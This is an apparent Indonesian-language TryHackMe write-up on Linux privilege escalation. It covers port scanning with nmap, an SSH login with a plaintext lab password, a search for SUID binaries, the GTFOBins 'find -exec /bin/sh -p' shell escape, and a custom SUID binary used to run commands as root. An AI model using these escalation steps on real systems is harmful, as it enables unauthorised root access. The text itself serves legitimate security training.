hidupkan THM machine untuk menyelesaikan task.

Q1:What port is SSH running on?
Q2:Find and run a ile as igor. Read the file /home/igor/flag1.txt
Q3:Find another binary file that has SUID bit set. Using this file, can you become the root
user and read the /root/flag2.txt file?


A1:
gunakan `nmap` untuk melakukan scanning port. untuk melakukannya secara lebih cepat,
dapat menggunakan command berikut:
```
nmap -p- -v --min-parallelism 100 <IP>
```

A2:
selanjutnya konek ke ssh dengan user, ip dan port yang sudah didapatkan dengan command
```
ssh holly@<IP> -p PORT

enter password : tuD@4vt0G*TU
```
untuk dapat membaca flag1.txt kita perlu menjadi user `igor`. kita dapat melakukannya dengan
melakukan privilege escalation dengan mencari file SUID binary. kita dapat melakukannya
dengan command
```
find / -perm /4000 -exec ls -la {} \; 2>/dev/null
```
nantinya akan ketemu file SUID milik igor, yang dapat di eksekusi juga oleh grup, yaitu
`/usr/bin/find`. kita dapat melakukan privesc dengan command yang sudah disediakan oleh
[GTFOBins](gtfobins.github.io), yaitu
```
<full path of file>/find . -exec /bin/sh -p \; -quit
```
setelah kita run, maka nantinya kita dapat berpindah menjadi user igor, kita dapat
mengeceknya dengan run command `whoami`. jika sudah, kita dapat melihat isi dari
flag1.txt dengan cara
```
cat /home/igor/flag1.txt
```

A3:
untuk dapat berpindah privilege yang lebih tinggi, yaitu menjadi `root`, kita perlu mencari
file SUID yang lain. dan yang bisa kita gunakan adalah file `/usr/bin/system-control`.
ketika kita langsung memasukkan itu dalam command, nantinya kita dapat input command dan
dijalankan sebagai root. jadi kita bisa melihat isi dari flag yang kedua
```
holly@ip-10-10-156-19:~$ /usr/bin/system-control

===== System Control Binary =====

Enter system command: ls /root
flag2.txt  snap

holly@ip-10-10-156-19:~$ /usr/bin/system-control

===== System Control Binary =====

Enter system command: cat /root/flag2.txt
```
